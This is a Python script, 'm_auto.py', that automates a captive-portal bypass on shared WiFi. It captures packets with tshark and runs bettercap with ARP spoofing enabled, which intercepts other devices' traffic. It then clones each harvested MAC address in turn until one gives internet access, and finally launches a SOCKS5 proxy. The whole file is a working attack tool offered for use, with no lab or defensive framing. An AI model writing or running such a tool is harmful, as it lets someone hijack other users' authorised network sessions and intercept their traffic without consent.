#!/usr/bin/env python3
"""
m_auto.py — Unified network recon + MAC changer + proxy automation.

Fully automated flow:
  1. Start tshark packet capture (background) → saves to .pcapng
  2. Launch bettercap with arp.spoof + net.probe for device discovery
  3. After a configurable duration (default 30s), stop both
  4. Auto-try each captured MAC address:
     - Change MAC → 5s delay → reconnect WiFi
     - curl http://google.com
     - If returns 200 → internet works → stop
     - Otherwise → try next MAC
  5. On success, auto-launch SOCKS5 proxy

Usage:
  sudo python3 m_auto.py [--interface en0] [--duration 30] [--output capture.pcapng]
"""

import os
import sys
import time
import signal
import subprocess
import argparse
import shutil
from pathlib import Path
from datetime import datetime


# ─── Colors ───────────────────────────────────────────────────────────────────
class C:
    HEADER  = '\033[95m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    RED     = '\033[91m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'


def banner():
    print(f"""
{C.CYAN}{C.BOLD}╔══════════════════════════════════════════════════════╗
║               m-auto  ·  network recon               ║
║     tshark → bettercap → mac changer → proxy         ║
╚══════════════════════════════════════════════════════╝{C.RESET}
""")


def log(icon, msg, color=C.RESET):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.DIM}[{ts}]{C.RESET} {color}{icon}{C.RESET}  {msg}")


def check_root():
    if os.geteuid() != 0:
        print(f"\n  {C.RED}✖  This script must be run as root (sudo).{C.RESET}")
        print(f"  {C.DIM}   Usage: sudo python3 m_auto.py{C.RESET}\n")
        sys.exit(1)


def check_dependencies():
    """Ensure tshark, bettercap, and macchanger are installed."""
    missing = []
    for tool in ['tshark', 'bettercap', 'macchanger']:
        if not shutil.which(tool):
            missing.append(tool)
    if missing:
        print(f"\n  {C.RED}✖  Missing required tools: {', '.join(missing)}{C.RESET}")
        print(f"  {C.DIM}   Install them before running this script.{C.RESET}\n")
        sys.exit(1)
    log("✔", "All dependencies found (tshark, bettercap, macchanger)", C.GREEN)


# ─── Phase 1: tshark capture ─────────────────────────────────────────────────
def start_tshark(interface, output_file):
    """Start tshark packet capture in the background."""
    log("📡", f"Starting tshark capture on {C.BOLD}{interface}{C.RESET} → {C.BOLD}{output_file}{C.RESET}")
    proc = subprocess.Popen(
        ['tshark', '-i', interface, '-w', output_file],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setpgrp  # own process group so we can kill cleanly
    )
    log("✔", f"tshark running (PID {proc.pid})", C.GREEN)
    return proc


def stop_tshark(proc):
    """Gracefully stop tshark capture."""
    if proc and proc.poll() is None:
        log("⏹", "Stopping tshark capture...")
        proc.send_signal(signal.SIGTERM)
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        log("✔", "tshark capture stopped", C.GREEN)


# ─── Phase 2: bettercap ──────────────────────────────────────────────────────
def run_bettercap(interface, duration):
    """
    Launch bettercap, enable arp.spoof + net.probe,
    wait for `duration` seconds, then exit.
    """
    log("🔍", f"Starting bettercap on {C.BOLD}{interface}{C.RESET} for {C.BOLD}{duration}s{C.RESET}")

    # Build a caplet-style command string that bettercap will execute
    # We use -eval to send interactive commands at launch
    eval_cmds = "arp.spoof on; net.probe on; sleep {}; quit".format(duration)

    proc = subprocess.Popen(
        ['bettercap', '-iface', interface, '-eval', eval_cmds],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    log("✔", "bettercap launched — arp.spoof on + net.probe on", C.GREEN)

    # Silently consume bettercap output, show countdown + MAC count
    import re
    mac_pattern = re.compile(r'([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})')
    discovered_macs = set()
    start_time = time.time()
    try:
        while proc.poll() is None:
            line = proc.stdout.readline()
            if line:
                # Extract any MAC addresses from the line
                found = mac_pattern.findall(line)
                for mac in found:
                    discovered_macs.add(mac.lower())
            elapsed = int(time.time() - start_time)
            remaining = max(0, duration - elapsed)
            print(f"\r  {C.DIM}[bettercap]{C.RESET} {C.BOLD}{remaining}s{C.RESET} remaining — {C.CYAN}{len(discovered_macs)}{C.RESET} MACs found   ", end="", flush=True)
        print()  # newline after countdown
    except KeyboardInterrupt:
        log("⚠", "Interrupted! Stopping bettercap...", C.YELLOW)
        proc.terminate()
        proc.wait()
        raise

    exit_code = proc.returncode
    if exit_code == 0:
        log("✔", "bettercap finished successfully", C.GREEN)
    else:
        log("⚠", f"bettercap exited with code {exit_code}", C.YELLOW)

    return exit_code


# ─── Phase 3: MAC changer (from arp_mac_changer_mac.py logic) ─────────────────
def get_mac_addresses_from_pcapng(pcapng_file):
    """
    Extract unique source MAC addresses from pcapng using tshark
    (avoids needing pyshark/venv dependency).
    """
    log("📄", f"Extracting MAC addresses from {C.BOLD}{pcapng_file}{C.RESET}...")

    try:
        result = subprocess.run(
            ['tshark', '-r', pcapng_file, '-T', 'fields', '-e', 'eth.src', '-Y', 'eth.src'],
            capture_output=True, text=True, check=True
        )
        macs = set(line.strip() for line in result.stdout.splitlines() if line.strip())
        return macs
    except subprocess.CalledProcessError as e:
        log("✖", f"Error reading pcapng: {e.stderr}", C.RED)
        return set()


def load_tested_macs(log_file):
    """Load already tested MAC addresses from log file."""
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            return set(line.strip() for line in f if line.strip())
    return set()


def save_tested_mac(log_file, mac):
    """Save a tested MAC address to the log file."""
    try:
        if not os.path.exists(log_file):
            real_user = os.environ.get('SUDO_USER', os.environ.get('USER', 'francislargo'))
            with open(log_file, 'w') as f:
                pass
            try:
                import pwd
                user_info = pwd.getpwnam(real_user)
                os.chown(log_file, user_info.pw_uid, user_info.pw_gid)
            except Exception:
                pass
        with open(log_file, 'a') as f:
            f.write(f"{mac}\n")
    except Exception as e:
        log("⚠", f"Could not write to {log_file}: {e}", C.YELLOW)


def toggle_wifi(interface, state):
    """Turn WiFi interface on or off."""
    action = "on" if state == "on" else "off"
    try:
        subprocess.run(['networksetup', '-setairportpower', interface, action], check=True,
                       capture_output=True, text=True)
        return True
    except subprocess.CalledProcessError as e:
        return False
        

def wait_for_wifi(interface, timeout=30, silent=False):
    """Dynamically wait until the WiFi interface gets an IP address."""
    if not silent:
        log("⏳", "Awaiting WiFi...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            result = subprocess.run(
                ['ipconfig', 'getifaddr', interface],
                capture_output=True, text=True
            )
            ip = result.stdout.strip()
            if ip:
                return True
        except Exception:
            pass
        time.sleep(2)

    return False


def change_mac_address(interface, mac_address, log_file):
    """Change MAC address using macchanger."""

    if not toggle_wifi(interface, "off"):
        return False
    time.sleep(1)
    if not toggle_wifi(interface, "on"):
        return False
    time.sleep(1)
    result = subprocess.run(
        ['macchanger', '-m', mac_address, interface],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        save_tested_mac(log_file, mac_address)
        return True
    else:
        return False


def check_internet(interface=None, retries=2):
    """Check internet by verifying google.com returns HTTP 200."""
    for attempt in range(1, retries + 1):
        try:
            result = subprocess.run(
                ['curl', '-Ls', '-o', '/dev/null',
                 '-w', '%{http_code}',
                 '--connect-timeout', '10', '--max-time', '15',
                 'http://google.com'],
                capture_output=True, text=True, timeout=20
            )
            if result.returncode == 0 and result.stdout.strip() == '200':
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(5)

    return False


def run_mac_changer(pcapng_file, interface):
    """
    Phase 3: Fully automated MAC changer.
    Tries each MAC, reconnects WiFi, checks internet via captive portal.
    Returns True if a working MAC was found (internet access confirmed).
    """
    log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tested_macs.log")

    all_macs = get_mac_addresses_from_pcapng(pcapng_file)
    tested_macs = load_tested_macs(log_file)
    new_macs = all_macs - tested_macs

    if not new_macs:
        log("ℹ", "No new MACs to test", C.BLUE)
        return False

    mac_list = sorted(new_macs)
    log("📋", f"{C.BOLD}{len(mac_list)}{C.RESET} new MACs ({len(tested_macs)} tested, {len(all_macs)} total)")

    for i, mac in enumerate(mac_list, 1):
        prefix = f"  {C.DIM}[{i}/{len(mac_list)}]{C.RESET} {mac}"
        print(f"{prefix}  ...", end="", flush=True)

        success = change_mac_address(interface, mac, log_file)
        if not success:
            print(f"\r{prefix}  {C.RED}✖ mac change failed{C.RESET}")
            continue

        time.sleep(5)

        print(f"\r{prefix}  {C.DIM}awaiting wifi...{C.RESET}     ", end="", flush=True)
        if not wait_for_wifi(interface, silent=True):
            print(f"\r{prefix}  {C.RED}✖ no wifi{C.RESET}              ")
            continue

        time.sleep(3)

        print(f"\r{prefix}  {C.DIM}checking internet...{C.RESET} ", end="", flush=True)
        if check_internet(interface):
            print(f"\r{prefix}  {C.GREEN}{C.BOLD}✔ success{C.RESET}                       ")
            return True
        else:
            print(f"\r{prefix}  {C.RED}✖ no access{C.RESET}                       ")

    log("ℹ", "All MACs tested, none worked", C.BLUE)
    return False


# ─── Phase 4: SOCKS5 proxy ────────────────────────────────────────────────────
def launch_proxy():
    """
    Launch the quiet SOCKS5 proxy script.
    Uses os.execv to hand off the terminal entirely to the proxy.
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    proxy_script = os.path.join(script_dir, "run_proxy", "quiet_socks_proxy.sh")

    if not os.path.exists(proxy_script):
        log("✖", f"Proxy script not found: {proxy_script}", C.RED)
        return

    log("🌐", f"Launching SOCKS5 proxy → {C.BOLD}{proxy_script}{C.RESET}")
    print()

    # Hand off to the proxy script — replaces this process
    os.execv("/bin/bash", ["/bin/bash", proxy_script])


# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='m-auto: Unified network recon + MAC changer automation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 m_auto.py
  sudo python3 m_auto.py --interface en0 --duration 60
  sudo python3 m_auto.py --output my_capture.pcapng --duration 45
        """
    )
    parser.add_argument('-i', '--interface', default='en0',
                        help='Network interface (default: en0)')
    parser.add_argument('-d', '--duration', type=int, default=30,
                        help='Bettercap scan duration in seconds (default: 30)')
    parser.add_argument('-o', '--output', default=None,
                        help='Output pcapng file (default: capture_<timestamp>.pcapng)')

    args = parser.parse_args()

    # Default output with timestamp so we don't overwrite previous captures
    if args.output is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        args.output = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            f"capture_{ts}.pcapng"
        )
    else:
        args.output = os.path.abspath(args.output)

    banner()
    check_root()
    check_dependencies()

    tshark_proc = None
    try:
        # ── Phase 1: Start tshark capture ──
        print(f"\n{C.HEADER}{C.BOLD}  ── Phase 1: Packet Capture ──{C.RESET}")
        tshark_proc = start_tshark(args.interface, args.output)
        time.sleep(2)  # let tshark initialize

        # ── Phase 2: Run bettercap ──
        print(f"\n{C.HEADER}{C.BOLD}  ── Phase 2: Bettercap Scan ({args.duration}s) ──{C.RESET}")
        run_bettercap(args.interface, args.duration)

        # ── Stop tshark ──
        stop_tshark(tshark_proc)
        tshark_proc = None

        # Check capture file
        if os.path.exists(args.output):
            size_mb = os.path.getsize(args.output) / (1024 * 1024)
            log("📦", f"Capture saved: {C.BOLD}{args.output}{C.RESET} ({size_mb:.1f} MB)")
        else:
            log("⚠", "No capture file was created!", C.YELLOW)
            sys.exit(1)

        # ── Phase 3: Automated MAC changer ──
        print(f"\n{C.HEADER}{C.BOLD}  ── Phase 3: Automated MAC Changer ──{C.RESET}")
        found_working_mac = run_mac_changer(args.output, args.interface)

        # Clean up capture file
        if os.path.exists(args.output):
            os.remove(args.output)

        # ── Phase 4: SOCKS5 proxy (auto-launch on success) ──
        if found_working_mac:
            print(f"\n{C.HEADER}{C.BOLD}  ── Phase 4: SOCKS5 Proxy (auto-launching) ──{C.RESET}")
            log("🚀", "Working MAC found — launching proxy automatically!")
            launch_proxy()
            # If we get here, execv failed — shouldn't normally happen
        else:
            print(f"\n{C.HEADER}{C.BOLD}  ── Phase 4: SOCKS5 Proxy ──{C.RESET}\n")
            launch_proxy_choice = input(
                f"  {C.YELLOW}{C.BOLD}No working MAC found. Launch proxy anyway? (y/n): {C.RESET}"
            ).strip().lower()
            if launch_proxy_choice == 'y':
                launch_proxy()
            else:
                log("⏹", "Proxy skipped", C.YELLOW)

        print(f"\n{C.GREEN}{C.BOLD}  ── Done! ──{C.RESET}\n")

    except KeyboardInterrupt:
        print(f"\n\n  {C.YELLOW}Interrupted by user. Cleaning up...{C.RESET}")
    finally:
        # Always clean up tshark if still running
        if tshark_proc:
            stop_tshark(tshark_proc)

    print()


if __name__ == "__main__":
    main()
